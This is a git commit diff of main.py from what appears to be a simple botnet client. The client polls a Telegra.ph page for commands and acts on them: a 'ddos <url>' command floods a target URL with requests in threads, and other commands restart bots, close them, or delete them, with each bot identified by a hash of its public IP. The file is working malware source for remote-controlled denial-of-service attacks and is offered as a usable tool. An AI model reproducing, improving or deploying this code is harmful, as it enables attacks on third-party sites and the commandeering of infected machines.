f75c78184115ab0b73d5c998e336d345cacc2db8
null <86558426+NullGuy-dev@users.noreply.github.com>
2024-06-18 18:43:08 +0300

    Update main.py

--- main.py
+++ main.py
@@ -5,16 +5,20 @@ import stun
 import sys
 import hashlib
 import os
+
 def dos(url):
 	try:
 		requests.get(url)
 		requests.post(url)
 	except requests.exceptions.ConnectionError:
 		pass
+
 def getNeedIP(mainQuery):
 	return hashlib.sha1(bytes(mainQuery.replace(f'{mainQuery} ', ''), encoding='utf-8')).hexdigest()
+
 def getTargetIP():
 	return hashlib.sha1(bytes(str(stun.get_ip_info()[1]), encoding='utf-8')).hexdigest()
+
 url = "" # Insert the link to Telegra.ph the village where you enter the command
 def mainTry():
 	while True:
@@ -23,7 +27,7 @@ def mainTry():
 			soup = BeautifulSoup(response.text, 'lxml')
 			command = soup.find_all('p')
 			textIW = command[0].text
-			if (textIW == "restartAll"):
+			if ("restartAll" in textIW):
                 #If you compiled this code in EXE, remove the line below, and insert: os.system("start your_main_file(exe)_name.exe")
 				os.system("python main.py")
 				sys.exit()
@@ -44,14 +48,13 @@ def mainTry():
 					sys.exit()
 			if ("ddos" in textIW):
 				urlForAttack = textIW.replace("ddos ", "")
-				ddosFunc = Thread(target=dos(urlForAttack), args=())
-				ddosFunc.start()
-			if (textIW == "closeAll"):
+				Thread(target=dos(urlForAttack), args=()).start()
+			if ("closeAll" in textIW):
 				sys.exit()
 			if ("closeApp" in textIW):
 				if (getNeedIP(textIW) == getTargetIP()):
 					sys.exit()
-			if (textIW == "deleteAllBotes"):
+			if ("deleteAllBotes" in textIW):
 				import delete
 				sys.exit()
 			if ("deleteBot" in textIW):
@@ -61,4 +64,5 @@ def mainTry():
 					sys.exit()
 		except requests.exceptions.ConnectionError:
 			pass
+
 Thread(target=mainTry, args=()).start()
